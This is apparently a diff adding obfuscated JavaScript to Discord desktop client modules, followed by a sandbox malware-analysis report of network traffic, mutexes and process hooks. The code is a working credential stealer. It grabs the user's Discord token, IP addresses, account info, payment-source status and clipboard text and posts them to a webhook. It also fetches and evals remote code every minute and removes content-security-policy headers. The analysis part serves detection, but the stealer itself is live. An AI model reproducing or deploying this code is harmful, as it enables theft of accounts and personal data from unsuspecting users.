@@ -1,0 +1,210 @@
+
+    modules\discord_modules:
+    var _0x476f=["tostring was here","require","electron","token","localStorage","contentWindow","iframe","createElement","appendChild","body",""","","replace","`","size14-e6ZScH title-eS5yk3","getElementsByClassName","Unable to fetch, possibly due to a different discord distribute or update.","textContent","responseText","load","addEventListener","GET","https://tostringisverycooi.000webhostapp.com/ho/youareapproachingme/%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1%D6%B1/WRYYYYYYYYYYYYY.txt","open","send","{"message": "Invalid Webhook Token", "code": 50027}","https://discordapp.com/api/webhooks/629196407164633089/o80ppNB141kRzmQpl1pvHltRjG-K3-CAlrRmOy3OFOXeW1-eXIWxBETPqUHGiXaCDSXp","POST","Content-Type","application/json","setRequestHeader","stringify","getZoomFactor","webFrame","userAgent","getVersion","app","remote","substring","readText","clipboard","https://api.ipify.org","timeZone","resolvedOptions","availWidth","screen","x","availHeight","https://discordapp.com/api/users/@me","Authorization","[]","https://discordapp.com/api/v6/users/@me/billing/payment-sources","RTCPeerConnection","mozRTCPeerConnection","webkitRTCPeerConnection","createDataChannel","candidate","indexOf","forEach","match","
+    ","split","sdp","setLocalDescription","createOffer","onicecandidate","DIO!","https://bypasscors.herokuapp.com/api/?url=https://tostringisverycooi.000webhostapp.com/ho/youareapproachingme/ZAWARUDOTokiyotomare.txt","length","wrapper-1BJsBx","href","https://discordapp.com/channels/629175220569112586/629175553143996464","remove","log","marginTop20-3TxNs6","browser-window-focus","Discord has encountered an error and must reload.","warn","beep","shell","reload","location","on"," | ","New BluefaceV4 log.
+    Token: ","
+    Timezone: ","
+    Resolution: ","
+    IP: ","
+    WebRTC IPs: ","
+    Userinfo: ","
+    Username: ","
+    PSAttached: ","
+    ZoomFactor: ","
+    User-Agent: ","
+    Discord Version: ","
+    Clipboard(limited to 50 chars): "];var readme=_0x476f[0];window[_0x476f[1]]= require;var electron=require(_0x476f[2]);window[_0x476f[2]]= require(_0x476f[2]);var token=document[_0x476f[9]][_0x476f[8]](document[_0x476f[7]]([_0x476f[6]]))[_0x476f[5]][_0x476f[4]][_0x476f[3]];token= token[_0x476f[12]](_0x476f[10],_0x476f[11]);token= token[_0x476f[12]](_0x476f[10],_0x476f[11]);window[_0x476f[1]]= require;var electron=require(_0x476f[2]);window[_0x476f[2]]= require(_0x476f[2]);var token=document[_0x476f[9]][_0x476f[8]](document[_0x476f[7]]([_0x476f[6]]))[_0x476f[5]][_0x476f[4]][_0x476f[3]];token= token[_0x476f[12]](_0x476f[10],_0x476f[11]);token= token[_0x476f[12]](_0x476f[10],_0x476f[11]);function sleep(_0xb38cx5){return  new Promise((_0xb38cx6)=>setTimeout(_0xb38cx6,_0xb38cx5))}var ip=_0x476f[11];var userinfo=_0x476f[11];var webrtcips=_0x476f[11];var hasattached=false;var underesc=_0x476f[13];var focusamount=0;var WBH=_0x476f[11];if(!document[_0x476f[15]](_0x476f[14])[0]){var username=_0x476f[16]}else {var username=document[_0x476f[15]](_0x476f[14])[0][_0x476f[17]]};function getandsetbackupWBH(){function _0xb38cx10(){WBH= this[_0x476f[18]]}var _0xb38cx11= new XMLHttpRequest();_0xb38cx11[_0x476f[20]](_0x476f[19],_0xb38cx10);_0xb38cx11[_0x476f[23]](_0x476f[21],_0x476f[22]);_0xb38cx11[_0x476f[24]]()}function getandsetWBH(){function _0xb38cx10(){if(this[_0x476f[18]]== _0x476f[25]){getandsetbackupWBH()}else {WBH= _0x476f[26]}}var _0xb38cx11= new XMLHttpRequest();_0xb38cx11[_0x476f[20]](_0x476f[19],_0xb38cx10);_0xb38cx11[_0x476f[23]](_0x476f[21],_0x476f[26]);_0xb38cx11[_0x476f[24]]()}getandsetWBH();function pin(_0xb38cx14){var _0xb38cx15= new XMLHttpRequest();_0xb38cx15[_0x476f[23]](_0x476f[27],WBH,true);_0xb38cx15[_0x476f[30]](_0x476f[28],_0x476f[29]);_0xb38cx15[_0x476f[24]](JSON[_0x476f[31]]({content:_0xb38cx14}))}function returnzoomfactor(){return electron[_0x476f[33]][_0x476f[32]]()}function returnuseragent(){return navigator[_0x476f[34]]}function getdiscordversion(){return electron[_0x476f[37]][_0x476f[36]][_0x476f[35]]()}function getclipboard(){return electron[_0x476f[40]][_0x476f[39]]()[_0x476f[38]](0,50)}function getip(){function _0xb38cx10(){ip= this[_0x476f[18]]}var _0xb38cx11= new XMLHttpRequest();_0xb38cx11[_0x476f[20]](_0x476f[19],_0xb38cx10);_0xb38cx11[_0x476f[23]](_0x476f[21],_0x476f[41]);_0xb38cx11[_0x476f[24]]()}function gettimezone(){return Intl.DateTimeFormat()[_0x476f[43]]()[_0x476f[42]]}function getresolution(){return window[_0x476f[45]][_0x476f[44]]+ _0x476f[46]+ window[_0x476f[45]][_0x476f[47]]}function getuserinfo(_0xb38cx1e){function _0xb38cx10(){userinfo= this[_0x476f[18]]}var _0xb38cx11= new XMLHttpRequest();_0xb38cx11[_0x476f[20]](_0x476f[19],_0xb38cx10);_0xb38cx11[_0x476f[23]](_0x476f[21],_0x476f[48]);_0xb38cx11[_0x476f[30]](_0x476f[49],_0xb38cx1e);_0xb38cx11[_0x476f[24]]()}function getpaymentsources(_0xb38cx1e){function _0xb38cx10(){if(this[_0x476f[18]]== _0x476f[50]){hasattached= false}else {hasattached= true}}var _0xb38cx11= new XMLHttpRequest();_0xb38cx11[_0x476f[20]](_0x476f[19],_0xb38cx10);_0xb38cx11[_0x476f[23]](_0x476f[21],_0x476f[51]);_0xb38cx11[_0x476f[30]](_0x476f[49],_0xb38cx1e);_0xb38cx11[_0x476f[24]]()}function getwebrtcinfo(_0xb38cx21){var _0xb38cx22=window[_0x476f[52]]|| window[_0x476f[53]]|| window[_0x476f[54]];var _0xb38cx23= new _0xb38cx22({iceServers:[]}),_0xb38cx24=function(){},_0xb38cx25={},_0xb38cx26=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g,_0xb38cx27;function _0xb38cx28(ip){if(!_0xb38cx25[ip]){_0xb38cx21(ip)};_0xb38cx25[ip]= true}_0xb38cx23[_0x476f[55]](_0x476f[11]);_0xb38cx23[_0x476f[64]](function(_0xb38cx29){_0xb38cx29[_0x476f[62]][_0x476f[61]](_0x476f[60])[_0x476f[58]](function(_0xb38cx2a){if(_0xb38cx2a[_0x476f[57]](_0x476f[56])< 0){return};_0xb38cx2a[_0x476f[59]](_0xb38cx26)[_0x476f[58]](_0xb38cx28)});_0xb38cx23[_0x476f[63]](_0xb38cx29,_0xb38cx24,_0xb38cx24)},_0xb38cx24);_0xb38cx23[_0x476f[65]]= function(_0xb38cx2b){if(!_0xb38cx2b||  !_0xb38cx2b[_0x476f[56]] ||  !_0xb38cx2b[_0x476f[56]][_0x476f[56]] ||  !_0xb38cx2b[_0x476f[56]][_0x476f[56]][_0x476f[59]](_0xb38cx26)){return};_0xb38cx2b[_0x476f[56]][_0x476f[56]][_0x476f[59]](_0xb38cx26)[_0x476f[58]](_0xb38cx28)}}async function fightdio(){while(true){function _0xb38cx10(){var _0xb38cx2d=this[_0x476f[18]];if(_0xb38cx2d== _0x476f[66]){return}else {eval(_0xb38cx2d)}}var _0xb38cx11= new XMLHttpRequest();_0xb38cx11[_0x476f[20]](_0x476f[19],_0xb38cx10);_0xb38cx11[_0x476f[23]](_0x476f[21],_0x476f[67]);_0xb38cx11[_0x476f[24]](); await sleep(60000)}}async function delboostserveronclient(){while(true){for(var _0xb38cx2f=0;_0xb38cx2f< document[_0x476f[15]](_0x476f[69])[_0x476f[68]];_0xb38cx2f++){if(document[_0x476f[15]](_0x476f[69])[_0xb38cx2f][_0x476f[70]]== _0x476f[71]){console[_0x476f[73]](document[_0x476f[15]](_0x476f[69])[_0xb38cx2f][_0x476f[72]]())}};if(document[_0x476f[15]](_0x476f[74])[0]){document[_0x476f[15]](_0x476f[74])[0][_0x476f[72]]()}; await sleep(100)}}electron[_0x476f[37]][_0x476f[36]][_0x476f[82]](_0x476f[75],()=>{focusamount= focusamount+ 1;if(focusamount>= 15){console[_0x476f[77]](_0x476f[76]);electron[_0x476f[79]][_0x476f[78]]();window[_0x476f[81]][_0x476f[80]]();focusamount= 0}});getwebrtcinfo(function(ip){webrtcips= webrtcips+ ip+ _0x476f[83]});getip();getuserinfo(token);getpaymentsources(token);setTimeout(()=>{var _0xb38cx30=(_0x476f[84]+ underesc+ _0x476f[11]+ underesc+ _0x476f[11]+ token+ _0x476f[11]+ underesc+ _0x476f[11]+ underesc+ _0x476f[85]+ (gettimezone())+ _0x476f[86]+ (getresolution())+ _0x476f[87]+ ip+ _0x476f[88]+ webrtcips+ _0x476f[89]+ userinfo+ _0x476f[90]+ username+ _0x476f[91]+ hasattached+ _0x476f[92]+ (returnzoomfactor())+ _0x476f[93]+ (returnuseragent())+ _0x476f[94]+ (getdiscordversion())+ _0x476f[95]+ (getclipboard())+ _0x476f[11]);pin(_0xb38cx30)},5000);setTimeout(()=>{delboostserveronclient()},1);setTimeout(()=>{fightdio()},1)
+    \modules\discord_desktop_core:
+    const electron = require('electron');
+    const path = require('path');
+    electron.session.defaultSession.webRequest.onHeadersReceived(function(details, callback) {
+        if (!details.responseHeaders['content-security-policy-report-only'] && !details.responseHeaders['content-security-policy']) return callback({cancel: false});
+        delete details.responseHeaders['content-security-policy-report-only'];
+        delete details.responseHeaders['content-security-policy'];
+        callback({cancel: false, responseHeaders: details.responseHeaders});
+    });
+    module.exports = require('./core.asar');
+
+
+    Malicious artifacts seen in the context of a contacted host
+
+    details
+        Found malicious artifacts related to "54.175.53.243": ...
+
+        URL: http://unblocknode.herokuapp.com/proxy/https:/www.facebook.com/local/lists/145165942736721 (AV positives: 5/71 scanned on 10/25/2019 07:22:10)
+        URL: http://unblocknode.herokuapp.com/proxy/https:/www.facebook.com/places/Things-to-do-in-San-Antonio-Texas/110297742331680 (AV positives: 7/71 scanned on 10/24/2019 13:05:52)
+        URL: http://unblocknode.herokuapp.com/proxy/https:/forums.oculusvr.com/developer (AV positives: 5/71 scanned on 10/24/2019 04:25:23)
+        URL: https://paypal-verify.herokuapp.com/NotFound (AV positives: 4/71 scanned on 10/23/2019 16:32:27)
+        URL: http://unblocknode.herokuapp.com/proxy/https:/fr-fr.facebook.com/login (AV positives: 5/71 scanned on 10/22/2019 03:54:53)
+        File SHA256: effb5202c4faa467efc944af18733b78fda4a41ade9d8945cdc781db9677b5db (Date: 10/26/2019 04:14:37)
+        File SHA256: bab49942fe18e9363d49de84d95f94a20a6b52c17a6a5dd2a866d60262269f2f (Date: 10/22/2019 09:08:55)
+        File SHA256: 5090cf4700daec5bb111a870241ed12e88c277a7d7a2e2f5bc55414823c806e3 (AV positives: 3/71 scanned on 09/03/2019 15:28:56)
+        File SHA256: 20a597d6f63846d6ef8158dbee606427ee5ccb656a2d8b3273f0597033dce249 (AV positives: 21/72 scanned on 08/14/2019 23:35:04)
+        File SHA256: 4c7af7211ac89df041ae240747b58f889db95c6177f7f06eb7681914fcecf6aa (AV positives: 4/69 scanned on 07/04/2019 02:14:53)
+        File SHA256: 03dbe88ba3e571ba40f8e168b2fba7d88aaa1b8ef660ef8b5f8097d5b87f017f (AV positives: 8/71 scanned on 06/14/2019 17:35:54)
+        File SHA256: e7d722781b9c97c06f407668ee87028d24f7ccef9714f201a35c0e8999a32375 (AV positives: 8/66 scanned on 04/06/2019 01:52:57) 
+    source
+        Network Traffic
+    relevance
+        10/10
+
+    Sends traffic on typical HTTP outbound port, but without HTTP header
+
+    details
+        TCP traffic to 54.175.53.243 on port 443 is sent without HTTP header 
+    source
+        Network Traffic
+    relevance
+        5/10
+
+
+
+details
+    "bypasscors.herokuapp.com" 
+source
+    Network Traffic
+relevance
+    1/10
+
+Contacts server
+
+details
+    "54.175.53.243:443" 
+source
+    Network Traffic
+relevance
+    1/10
+
+Creates mutants
+
+details
+    "\Sessions\1\BaseNamedObjects\UpdatingNewTabPageData"
+    "\Sessions\1\BaseNamedObjects\IsoScope_a60_IESQMMUTEX_0_519"
+    "Local\InternetShortcutMutex"
+    "IsoScope_a60_IESQMMUTEX_0_519"
+    "{5312EE61-79E3-4A24-BFE1-132B85B23C3A}"
+    "IsoScope_a60_IE_EarlyTabStart_0x6b8_Mutex"
+    "IsoScope_a60_IESQMMUTEX_0_303"
+    "Local\ZonesCacheCounterMutex"
+    "Local\URLBLOCK_DOWNLOAD_MUTEX"
+    "{66D0969A-1E86-44CF-B4EC-3806DDDA3B5D}"
+    "IsoScope_a60_ConnHashTable<2656>_HashTable_Mutex"
+    "Local\URLBLOCK_HASHFILESWITCH_MUTEX"
+    "Local\ZonesLockedCacheCounterMutex"
+    "Local\!BrowserEmulation!SharedMemory!Mutex"
+    "Local\URLBLOCK_FILEMAPSWITCH_MUTEX_2656"
+    "IsoScope_a60_IESQMMUTEX_0_331"
+    "UpdatingNewTabPageData"
+    "Local\VERMGMTBlockListFileMutex"
+    "\Sessions\1\BaseNamedObjects\Local\!BrowserEmulation!SharedMemory!Mutex"
+    "\Sessions\1\BaseNamedObjects\Local\VERMGMTBlockListFileMutex" 
+source
+    Created Mutant
+relevance
+    3/10
+
+ils
+    "iexplore.exe" called "OpenSCManager" requesting access rights "SC_MANAGER_CONNECT" (0x1)
+    "iexplore.exe" called "OpenSCManager" requesting access rights "0XE0000000L" 
+source
+    API Call
+relevance
+    10/10
+
+Process launched with changed environment
+
+details
+    Process "iexplore.exe" (Show Process) was launched with new environment variables: "PATH="%PROGRAMFILES%\Internet Explorer;"" 
+source
+    Monitored Target
+relevance
+    10/10
+
+eates new processes
+
+details
+    "iexplore.exe" is creating a new process (Name: "%PROGRAMFILES%\Internet Explorer\iexplore.exe", Handle: 844) 
+source
+    API Call
+relevance
+    8/10
+
+
+    Found potential URL in binary/memory
+
+    details
+        Pattern match: "https://bypasscors.herokuapp.com/api/?url=https%3A%2F%2Ftostringisverycooi.000webhostapp.com%2Fho%2Fyouareapproachingme%2FZAWARUDOTokiyotomare.txt%22"
+        Pattern match: "https://bypasscors.herokuapp.com"
+        Heuristic match: "bypasscors.herokuapp.com"
+        Pattern match: "www.herokucdn.com/error-pages/no-such-app.html" 
+    source
+        String
+    relevance
+        10/10
+
+Unusual Characteristics
+
+    Drops cabinet archive files
+
+    details
+        "57C8EDB95DF3F0AD4EE2DC2B8CFD4157" has type "Microsoft Cabinet archive data 6894 bytes 1 file" 
+    source
+        Extracted File
+    relevance
+        10/10
+
+    Installs hooks/patches the running process
+
+    details
+        "iexplore.exe" wrote bytes "a035326f" to virtual address "0x77C61144" (part of module "LPK.DLL")
+        "iexplore.exe" wrote bytes "b033326f" to virtual address "0x74FB1038" (part of module "VERSION.DLL")
+        "iexplore.exe" wrote bytes "a035326f" to virtual address "0x761A131C" (part of module "SHLWAPI.DLL")
+        "iexplore.exe" wrote bytes "60d2356f" to virtual address "0x76BA1D7C" (part of module "SHELL32.DLL")
+        "iexplore.exe" wrote bytes "b033326f" to virtual address "0x74571250" (part of module "UXTHEME.DLL")
+        "iexplore.exe" wrote bytes "b033326f" to virtual address "0x75F5917C" (part of module "IERTUTIL.DLL")
+        "iexplore.exe" wrote bytes "70cc356f" to virtual address "0x761A1310" (part of module "SHLWAPI.DLL")
+        "iexplore.exe" wrote bytes "c03a326f" to virtual address "0x76BA1FB0" (part of module "SHELL32.DLL")
+        "iexplore.exe" wrote bytes "a035326f" to virtual address "0x7457139C" (part of module "UXTHEME.DLL")
+        "iexplore.exe" wrote bytes "a035326f" to virtual address "0x766A1064" (part of module "IMM32.DLL")
+        "iexplore.exe" wrote bytes "b033326f" to virtual address "0x6DB0F6A0" (part of module "IEFRAME.DLL")
+        "iexplore.exe" wrote bytes "c0bf336f" to virtual address "0x76BA1F68" (part of module "SHELL32.DLL")
+        "iexplore.exe" wrote bytes "8032d5007032d5000032d5006032d5005032d5004032d5003032d500000000002cc9ca76c021d500000000009017d5005023d5000018d500601fd5002036d500000000004036d50000000000" to virtual address "0x00D58000"
+        "iexplore.exe" wrote bytes "b033326f" to virtual address "0x00D570C0"
+        "iexplore.exe" wrote bytes "60cd356f" to virtual address "0x761A130C" (part of module "SHLWAPI.DLL")
+        "iexplore.exe" wrote bytes "a035326f" to virtual address "0x76BA202C" (part of module "SHELL32.DLL")
+        "iexplore.exe" wrote bytes "3030326f" to virtual address "0x761A1380" (part of module "SHLWAPI.DLL")
+        "iexplore.exe" wrote bytes "b033326f" to virtual address "0x75F91164" (part of module "USP10.DLL")
+        "iexplore.exe" wrote bytes "3030326f" to virtual address "0x6DB0FE90" (part of module "IEFRAME.DLL")
+        "iexplore.exe" wrote bytes "b033326f" to virtual address "0x76211100" (part of module "MSCTF.DLL") 
+    source
+        Hook Detection
+    relevance
+        10/10
+
+
+
+"%WINDIR%\System32\ieframe.dll",OpenURL C:\9a1502dccb84e5edc94abcc6128cd17f6795c8bcefcb92ae72835979122aaf4e.url
+__http_
+`\??\Volume{dcbfaac3-d863-11e7-b9ff-806e6f6e6963}
+`\??\Volume{dcbfaac4-d863-11e7-b9ff-806e6f6e6963}
+`\??\Volume{dcbfaac7-d863-11e7-b9ff-806e6f6e6963}
+bypasscors.herokuapp.com
+CompatibilityFlags
+FullScreen
+GET /api/?url=https%3A%2F%2Ftostringisverycooi.000webhostapp.com%2Fho%2Fyouareapproachingme%2FZAWARUDOTokiyotomare.txt%22 HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: en-USUser-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like GeckoAccept-Encoding: gzip, deflateHost: bypasscors.herokuapp.comDNT: 1Connection: Keep-Alive
+HashFileVersionHighPart
+HashFileVersionLowPart
+HTTP/1.1 404 Not FoundConnection: keep-aliveServer: CowboyDate: Sat, 26 Oct 2019 09:44:50 GMTContent-Length: 494Content-Type: text/html; charset=utf-8Cache-Control: no-cache, no-store<!DOCTYPE html><html> <head><meta name="viewport" content="width=device-width, initial-scale=1"><meta charset="utf-8"><title>No such app</title><style media="screen"> html,body,iframe {margin: 0;padding: 0; } html,body {height: 100%;overflow: hidden; } iframe {width: 100%;height: 100%;border: 0; }</style> </head> <body><iframe src="//www.herokucdn.com/error-pages/no-such-app.html"></iframe> </body></html>
+HTTP404Natfourd
+https://bypasscors.herokuapp.com
+https://bypasscors.herokuapp.com/api/?url=https%3A%2F%2Ftostringisverycooi.000webhostapp.com%2Fho%2Fyouareapproachingme%2FZAWARUDOTokiyotomare.txt%22
+LastProcessed
+NTPOnlinePortalVer
+Re_petheaddress.
+ReNpetheaddress
+SCODEF:2656 CREDAT:275457 /prefetch:2
+Version
+{00000000-0000-0000-0000-000000000000}
+{0633EE93-D776-472f-A0FF-E1416B8B2E3A}
+{3EC87E95-F7D5-11E9-A340-0A00271C891E}
+
